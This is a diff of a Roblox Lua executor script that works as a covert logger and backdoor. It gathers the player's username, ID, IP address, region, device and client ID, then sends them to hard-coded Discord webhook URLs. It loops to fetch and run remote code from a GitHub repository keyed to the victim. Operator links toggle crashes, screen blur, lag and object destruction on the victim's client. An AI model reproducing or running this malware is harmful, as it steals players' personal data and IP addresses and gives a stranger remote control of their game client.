@@ -1,8 +1,16 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalizationService = game:GetService("LocalizationService")
-local UserInputService = game:GetService("UserInputService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local UserInputService = game:GetService("UserInputService")
+local Lplr = game.Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local clientId = RbxAnalyticsService:GetClientId()
+local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local ip = game:HttpGet("https://api.ipify.org")
+local response = game:HttpGet("http://ip-api.com/json/" .. tostring(ip))
+local allInfo = HttpService:JSONDecode(response)
+local countryCode, region = allInfo["countryCode"], allInfo["regionName"]
 
 local platform = UserInputService:GetPlatform()
 local platformNames = {
@@ -11,165 +19,129 @@ local platformNames = {
     [Enum.Platform.IOS] = "iOS Device",
     [Enum.Platform.Android] = "Android Device",
     [Enum.Platform.UWP] = "UWP",
-    [Enum.Platform.PS4] = "PlayStation 4",
 }
 local deviceType = platformNames[platform] or "Unknown Device"
+local executor = identifyexecutor() or "unknown"
 
-local playerName = Players.LocalPlayer.Name
-local playerId = Players.LocalPlayer.UserId
-local clientId = RbxAnalyticsService:GetClientId()
-local currentPlaceId = game.PlaceId
-local currentJobId = tostring(game.JobId)
-local teleportCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. currentPlaceId .. ", '" .. currentJobId .. "')"
-local timestamp = os.date("%Y-%m-%d %H:%M:%S")
-
-local playerCountry
-local ipAddress = "Unknown"
-local githubRepo = "Pumpuma/test"
-local scriptFileName = clientId .. ".lua"
-local emptyFileName = playerName .. ".lua"
-
-local success, result = pcall(function()
-    return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
-end)
-playerCountry = success and result or "Unknown"
-
-local executorName = identifyexecutor()
-
-local skipIpRetrievalList = {
-    "ExecutorA",
-    "ExecutorB",
-    "ExecutorC"
-}
-
-local skipIpRetrieval = false
-for _, name in ipairs(skipIpRetrievalList) do
-    if executorName == name then
-        skipIpRetrieval = true
-        break
-    end
-end
-
-if not skipIpRetrieval then
-    if syn then
-        ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
-    elseif http then
-        ipAddress = http.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
-    end
-    ipAddress = HttpService:JSONDecode(ipAddress).ip
-end
-
-local function generateCreateScriptURL()
+local function Troll()
+    local Name = clientId .. ".lua"
     local content = [[
 -- universal
 _G.Crash = false
 _G.Taco = false
+_G.Lag = false
+_G.Blind = true
 
 -- Trident survival
 _G.Ban = false
 _G.BPlayer = false
 _G.Small = false
-
 ]]
-    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. scriptFileName .. "&value=" .. HttpService:UrlEncode(content)
+    return "https://github.com/Pumpuma/test/new/main?filename=" .. Name .. "&value=" .. HttpService:UrlEncode(content)
 end
 
-local function generateCreateEmptyFileURL()
+function blind()
+    local blur = Instance.new("BlurEffect", Lighting)
+    blur.Size = 24
+end
+
+
+local function execute()
+    local Name = Lplr.Name .. ".lua"
     local content = [[
 local executed = false
-
 if executed == false then
     executed = true
-    
-    
-    
 end
 ]]
-    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. emptyFileName .. "&value=" .. HttpService:UrlEncode(content)
+    return "https://github.com/Pumpuma/test/new/main?filename=" .. Name .. "&value=" .. HttpService:UrlEncode(content)
 end
 
-local function generateEditScriptURL()
-    return "https://github.com/" .. githubRepo .. "/edit/main/" .. scriptFileName
-end
-
-local function generateIpInfoURL(ip)
-    return "https://ipinfo.io/" .. ip
-end
-
-local webhookURL = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"
-local webhookData = {
+local webhookUrl = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO"
+local payload = {
     ["content"] = " ",
     ["embeds"] = {
         {
-            ["title"] = "Logger Information",
-            ["description"] = "Player Name: " .. playerName .. "\n" ..
-                              "Player ID: " .. playerId .. "\n" ..
-                              "Country: " .. playerCountry .. "\n" ..
-                              "Platform: " .. deviceType .. "\n" ..
-                              "IP Address: " .. ipAddress .. "\n" ..
-                              "Executor: " .. executorName .. "\n" ..
-                              "Timestamp: " .. timestamp .. "\n" ..
-                              "Join Command: ```" .. teleportCommand .. "```",
+            ["title"] = "Uki logs",
+            ["description"] = "**   USER INFO**\n" ..
+                              "Username: " .. Lplr.Name .. "\n" ..
+                              "User ID: " .. Lplr.UserId .. "\n" ..
+                              "Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
+                              "Prem: " .. (Lplr.MembershipType == Enum.MembershipType.Premium and "Yes" or "No") .. "\n" ..
+                              "Location: " .. region .. ", " .. countryCode .. "\n" ..
+                              "IP: " .. ip .. "\n" ..
+                              "Device: " .. deviceType .. "\n" ..
+                              "Executor: " .. executor .. "\n" ..
+                              "Client ID:\n" .. clientId .. "\n\n" .. 
+                              "**   GAME INFO**\n" ..
+                              "Game: " .. gameInfo.Name .. "\n\n" ..
+                              "**   COMMAND STATION**\n" ..
+                              "[Troll](" .. Troll() .. ")\n" ..
+                              "[Execute](" .. execute() .. ")\n" ..
+                              "[IP Info](https://ipinfo.io/" .. ip .. ")",
             ["type"] = "rich",
-            ["color"] = tonumber(0x4CAF50),
+            ["color"] = tonumber(0x00FF00),
             ["image"] = {
-                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(playerName)
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(Lplr.Name)
             },
-            ["fields"] = {
-                {
-                    ["name"] = "Actions",
-                    ["value"] = "[blacklist](" .. generateEditScriptURL() .. ")\n" ..
-                                "[Troll](" .. generateCreateScriptURL() .. ")\n" ..
-                                "[execute](" .. generateCreateEmptyFileURL() .. ")\n" ..
-                                "[IP Info](" .. generateIpInfoURL(ipAddress) .. ")",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Client ID",
-                    ["value"] = clientId,
-                    ["inline"] = true
-                }
+            ["footer"] = {
+                ["text"] = "Made by Yeno"
             }
         }
     }
 }
 
-local encodedData = HttpService:JSONEncode(webhookData)
-local headers = {["content-type"] = "application/json"}
-local request = http_request or request or HttpPost or syn.request
-local requestData = {Url = webhookURL, Body = encodedData, Method = "POST", Headers = headers}
+local newdata = HttpService:JSONEncode(payload)
 
-local success, errorMsg = pcall(function()
-    request(requestData)
-end)
-if not success then
-    warn("Failed to send Discord message: " .. errorMsg)
-end
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local request = http_request or request or HttpPost or syn.request
+local requestData = {
+    Url = webhookUrl,
+    Body = newdata,
+    Method = "POST",
+    Headers = headers
+}
+request(requestData)
+
 
 while true do
     wait(5)
     local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/" .. scriptFileName))()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. clientId .. ".lua"))()
     end)
-
     if success then
-        break
-    else
-        warn("Failed to load the script: " .. result)
+        print(" ")
     end
 end
 
-local tacoPlayed = false
-local crashInitiated = false
-local banPerformed = false
-local bplayerDestroyed = false
-local smallAdjusted = false
+
+
+while true do
+    wait(5)
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. Lplr.Name .. ".lua"))()
+    end)
+    if success then
+    print(" ")
+    end
+end
+
+
+local Taco = false
+local Crash = false
+local Ban = false
+local Bplayer = false
+local Small = false
+local blinded = false
 
 while true do
     wait(1)
     
-    if _G.Taco and not tacoPlayed then
-        tacoPlayed = true
+    if _G.Taco and not Taco then
+        Taco = true
         local sound = Instance.new("Sound")
         sound.SoundId = "rbxassetid://142376088"
         sound.Looped = true
@@ -178,39 +150,42 @@ while true do
         sound:Play()
     end
     
-    if _G.Crash and not crashInitiated then
-        crashInitiated = true
+    if _G.Crash and not Crash then
+        Crash = true
         while true do end
     end
-    
-    if _G.Ban and not banPerformed then
-        banPerformed = true
+
+    if _G.Ban and not Ban then
+        Ban = true
         local remoteEvent = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
         if remoteEvent then remoteEvent:Destroy() end
     end
     
-    if _G.BPlayer and not bplayerDestroyed then
-        bplayerDestroyed = true
-        local ignore = game:GetService("Workspace"):FindFirstChild("Ignore")
-if ignore then ignore:Destroy() end
+    if _G.BPlayer and not Bplayer then
+        Bplayer = true
+        local ignorePart = workspace.Ignore
+        if ignorePart then ignorePart:Destroy() end
     end
     
-    if _G.Small and not smallAdjusted then
-        smallAdjusted = true
-        local constraint = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
+    if _G.Small and not Small then
+        Small = true
+        local constraint = workspace.Ignore.LocalCharacter and workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
         if constraint then
             constraint.LowerLimit = 1
             constraint.UpperLimit = 1
         end
     end
-end
 
+    if _G.Blind and not blinded then
+        blinded = true
+        blind()
+    end
 
-
-while true do
-    wait(5)
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/" .. emptyFileName))()
-    end)
-
+    if _G.Lag then
+        while task.wait() do
+            for i = 1, 125 do
+                print(math.sqrt(i))
+            end
+        end
+    end
 end
